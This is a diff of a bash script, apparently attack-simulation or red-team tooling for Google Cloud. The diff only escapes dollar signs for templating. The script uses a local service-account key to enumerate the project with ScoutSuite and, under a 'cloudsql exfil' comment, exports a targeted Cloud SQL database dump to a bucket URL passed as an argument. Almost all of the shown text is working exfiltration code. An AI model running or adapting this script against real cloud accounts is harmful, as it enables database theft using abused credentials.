@@ -21,12 +21,12 @@ EOH
 for i in "$@"; do
   case $i in
     -h|--help)
-        HELP="${i#*=}"
+        HELP="$${i#*=}"
         shift # past argument=value
         help
         ;;
     -b=*|--bucket-url=*)
-        BUCKET_URL="${i#*=}"
+        BUCKET_URL="$${i#*=}"
         shift # past argument=value
         ;;
     *)
@@ -50,14 +50,14 @@ export GOOGLE_APPLICATION_CREDENTIALS=~/.config/gcloud/credentials.json
 gcloud auth activate-service-account --key-file ~/.config/gcloud/credentials.json | tee -a $LOGFILE
 PROJECT=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $2 }' | sed 's/.iam.gserviceaccount.com//g')
 USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
-DEPLOYMENT=$(echo ${USER##*-})
+DEPLOYMENT=$(echo $${USER##*-})
 
 # cloud enumeration
 scout gcp --service-account ~/.config/gcloud/credentials.json --report-dir /$SCRIPTNAME/scout-report --project-id=$PROJECT --no-browser 2>&1 | tee -a $LOGFILE 
 
 # cloudsql exfil snapshot and export
 SQL_INSTANCES=$(gcloud sql instances list --project=$PROJECT --format="json")
-log "found sql instances: ${SQL_INSTANCES}"
+log "found sql instances: $${SQL_INSTANCES}"
 SQL_INSTANCE=$(echo $SQL_INSTANCES | jq -r --arg i $DEPLOYMENT '.[] | select(.name | endswith($i)) | .name')
 log "found target instance: $SQL_INSTANCE"
 SQL_DETAILS=$(gcloud sql instances describe $SQL_INSTANCE --project=$PROJECT --format="json")
@@ -71,4 +71,4 @@ log "target instance region: $SQL_REGION"
 # BUCKET_URL=$(echo $BUCKETS | jq -r --arg i $DEPLOYMENT '.[] | select(.name | contains($i)) | .storage_url')
 # gsutil ls -l $BUCKET_URL 2>&1 | tee -a $LOGFILE 
 # BUCKET_URL="gs://db-backup-target-ab77012a-9e01/"
-gcloud sql export sql --project=$PROJECT $SQL_INSTANCE "${BUCKET_URL}${SQL_INSTANCE}_dump.gz" 2>&1 | tee -a $LOGFILE 
+gcloud sql export sql --project=$PROJECT $SQL_INSTANCE "$${BUCKET_URL}$${SQL_INSTANCE}_dump.gz" 2>&1 | tee -a $LOGFILE 
